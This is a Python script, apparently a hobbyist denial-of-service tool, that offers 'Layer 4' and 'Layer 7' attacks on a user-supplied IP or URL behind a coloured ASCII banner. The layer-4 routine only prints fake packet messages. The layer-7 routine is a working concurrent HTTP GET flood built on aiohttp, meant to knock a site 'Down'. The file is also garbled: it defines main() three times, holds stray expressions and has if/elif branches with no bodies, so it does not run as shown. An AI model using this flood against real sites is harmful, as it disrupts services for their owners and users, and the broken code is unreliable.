import aiohttp
import asyncio
import time
import os
import random
import sys
from colorama import Fore, Style, init

# Inisialisasi colorama
init(autoreset=True)

def clear():
    os.system("cls" if os.name == "nt" else "clear")

# ============================
#   Typing Animation
# ============================
def typewriter(text, delay=0.002):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()  # newline

# ============================
#   Banner ASCII
# ============================
def display_header():
    header_lines = [
        Fore.BLACK + "═══════════════════════════════════════════════════════════════════",     
        Fore.YELLOW + "    ",
        Fore.YELLOW + "       ╔══" + Fore.MAGENTA + "         ╔═══════╗" + Fore.GREEN + "    ╔════╗ ╔════╗" + Fore.WHITE + " ╔══╗" + Fore.BLUE + " ╔═══╗     ╔══╗",
        Fore.YELLOW + "       ███ ║" + Fore.MAGENTA + "      ████████ ║" + Fore.GREEN + "   █████ ║█████ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ████ ║    ██ ║ ",
        Fore.YELLOW + "      ██ ██ ║" + Fore.MAGENTA + "     ██ ║    ██ ║" + Fore.GREEN + " ██ ║ ██ ║ ██ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ██ ██ ║   ██ ║ ",
        Fore.YELLOW + "     ██ ║ ██ ║" + Fore.MAGENTA + "    ██ ║    ██ ║" + Fore.GREEN + " ██ ║ ██ ║ ██ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ██  ██ ║  ██ ║   ",
        Fore.YELLOW + "    ██ ╚══ ██ ║" + Fore.MAGENTA + "   ██ ║    ██ ║" + Fore.GREEN + " ██ ║ ██ ║ ██ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ██ ║ ██ ║ ██ ║ ",
        Fore.YELLOW + "   ███████  ██ ║" + Fore.MAGENTA + "  ██ ║    ██ ║" + Fore.GREEN + " ██ ║ ██═╝ ██ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ██ ║  ██ ║██ ║ ",
        Fore.YELLOW + "  ██ ║       ██ ║" + Fore.MAGENTA + " ██ ╚════██ ║" + Fore.GREEN + " ██ ║      ██ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ██ ║   ██ ██ ║ ",
        Fore.YELLOW + " ██═╝         ██═╝" + Fore.MAGENTA + "████████═╝" + Fore.GREEN + "   ██═╝      ██═╝" + Fore.WHITE + " ██═╝" + Fore.BLUE + " ██═╝    ████═╝ ",
        Fore.YELLOW + "    ",
        Fore.RED + "        ██═╗    ██═╗" + Fore.WHITE + "     ████═╗" + Fore.BLUE + "      ███████ ║" + Fore.YELLOW + "  ██═╗   ██═╗ ",
        Fore.RED + "        ██ ║    ██ ║" + Fore.WHITE + "    ██ ╔═██ ║" + Fore.BLUE + "   ██ ╔═════╝" + Fore.YELLOW + "  ██ ║  ██ ║ ",
        Fore.RED + "        ██ ║    ██ ║" + Fore.WHITE + "   ██ ║   ██ ║" + Fore.BLUE + "  ██ ║" + Fore.YELLOW + "        ██ ║██ ║ ",
        Fore.RED + "        ██ ║    ██ ║" + Fore.WHITE + "   ██ ║   ██ ║" + Fore.BLUE + "  ██ ║" + Fore.YELLOW + "        ████ ║ ",
        Fore.RED + "        ██████████ ║" + Fore.WHITE + "   ██ ║   ██ ║" + Fore.BLUE + "  ██ ║" + Fore.YELLOW + "        ██ ║██ ║ ",
        Fore.RED + "        ██ ╔════██ ║" + Fore.WHITE + "   ██████ ██ ║" + Fore.BLUE + "  ██ ║" + Fore.YELLOW + "        ██ ║  ██ ║ ",
        Fore.RED + "        ██ ║    ██ ║" + Fore.WHITE + "   ██ ║   ██ ║" + Fore.BLUE + "   ███████ ║" + Fore.YELLOW + "  ██ ║   ██ ║ ",
        Fore.RED + "        ╚══╝    ╚══╝" + Fore.WHITE + "   ╚══╝   ╚══╝" + Fore.BLUE + "   ╚═══════╝" + Fore.YELLOW + "  ╚══╝   ╚══╝ ",
        Fore.BLACK + "══════════════════════════════════════════════════════════════════",     
    ]
    for line in header_lines:
        print(line)
        time.sleep(0.0015)  # typing effect


# ============================
#   Layer 4 Stress Tes
# ============================
def main():
    clear()
    display_header()
    Fore.CYAN + "╔════════════════════════════════════════════════════════════════╗",
    Fore.CYAN + "║ \033[100m " + Fore.WHITE + "╔╗            ╔════╗",
    Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ╔╝╔══╗╚╗",
    Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╔╝    ╚╗║",
    Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║║       ║║",
    Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╚════╝║",
    Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╔════╗║",
    Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║╚═════╗║║       ║║",
    Fore.CYAN + "║ \033[100m " + Fore.WHITE + "╚══════╝╚╝       ╚╝",
    Fore.CYAN + "╚════════════════════════════════════════════════════════════════╝",
    if choice == "1":
        target_ip = input("===⟩\033[32m IP: \033[33m")
        duration = int(input("===⟩\033[321m Duration: \033[33m"))
        layer4_attack(target_ip, duration)
def layer4_attack(target_ip, duration):
    print(Fore.RED + f"\n[🔥] Starting Layer 4 attack to {target_ip} for {duration} seconds...\n")
    start_time = time.time()
    while time.time() - start_time < duration:
        port = random.randint(20, 65535)
        CSS = random.randint(64, 1500)
        print(Fore.YELLOW + f"[] LAYER 4 {Fore.WHITE}ADMIN-HACK {Fore.BLUE} SEN-PACKET {Fore.GREEN} {CSS} {Fore.RED} BYTES TO {target_ip}:{port} {Fore.WHITE}Running ::")
        print(Fore.RED + f"[] LAYER 4 {Fore.YELLOW}ADMIN-HACK {Fore.CYAN} SEN-PACKET {Fore.YELLOW} {CSS} {Fore.WHITE} BYTES TO {target_ip}:{port} {Fore.GREEN}Running :::")
        time.sleep(0.2)
    print(Fore.GREEN + "\n[✔] LAYER 4 \033[1;31m F I N N A L Y  AT T A C K !\n")

# ============================
#   Layer 7 Stress Test
# ============================
def main():
    clear()
    display_header()
    Fore.CYAN + "╔════════════════════════════════════════════════════════════════╗",
    Fore.CYAN + "║ \033[100m " + Fore.WHITE + "╔╗            ╔════╗",
    Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ╔╝╔══╗╚╗",
    Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╔╝    ╚╗║",
    Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║║       ║║",
    Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╚════╝║",
    Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╔════╗║",
    Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║╚═════╗║║       ║║",
    Fore.CYAN + "║ \033[100m " + Fore.WHITE + "╚══════╝╚╝       ╚╝",
    Fore.CYAN + "╚════════════════════════════════════════════════════════════════╝",
    elif choice == "2":
        url = input("==⟩ \033[32mURL: \033[33m")
        concurrency = int(input("==⟩ \033[32mSize: \033[33m"))
        duration = int(input("==⟩ \033[32mDuration: \033[33m"))
        asyncio.run(layer7_attack(url, concurrency, duration))
                  
async def worker(session, url, stop_time):
    hits = 0
    while time.time() < stop_time:
        try:
            async with session.get(url) as resp:
                await resp.text()
                hits += 1
                print(Fore.RED + f"[÷] {Fore.BLUE} LAYER7 {Fore.CYAN}ADMIN-HACK {Fore.YELLOW}REQUEST-SENT {Fore.RED} {url} {Fore.YELLOW}Running ::")
                print(Fore.WHITE + f"[÷] {Fore.YELLOW} LAYER7 {Fore.WHITE}ADMIN-HACK {Fore.BLUE}REQUEST-SENT {Fore.YELLOW} {url} {Fore.GREEN}Running :")
        except:
            print(Fore.RED + f"[x] {Fore.GREEN}LAYER7 {Fore.YELLOW}Request failed =⟩ {Fore.RED} {url} {Fore.WHITE} Down..!")
    return hits

async def layer7_attack(url, concurrency, duration):
    stop_time = time.time() + duration
    async with aiohttp.ClientSession() as session:
        tasks = [worker(session, url, stop_time) for _ in range(concurrency)]
        results = await asyncio.gather(*tasks)
    print(Fore.WHITE + f"\n[✔] Total requests sent: {sum(results)}")

# ============================
#   Menu Utama
# ============================
def main():
    clear()
    display_header()
    print(Fore.CYAN + "╔════════════════════════════════════════════════════════════════╗ ")
    print(Fore.CYAN + Style.BRIGHT + "║  Author By: KUNFAY/github.com/nawaksara873-0xy/Copyright.2025  ║")
    print(Fore.CYAN + "╚════════════════════════════════════════════════════════════════╝ ")
    print(Fore.YELLOW + "1. Layer 4 IP \033[1;32m✓")
    print(Fore.YELLOW + "2. Layer 7 HTTP \033[1;32m✓")
    choice = input(Fore.WHITE + "\nSelect option: ")

if choice == "1":  
 elif choice == "2":

else:
    print(Fore.RED + "\n[!] Invalid choice.")
    
if __name__ == "__main__":
    main()
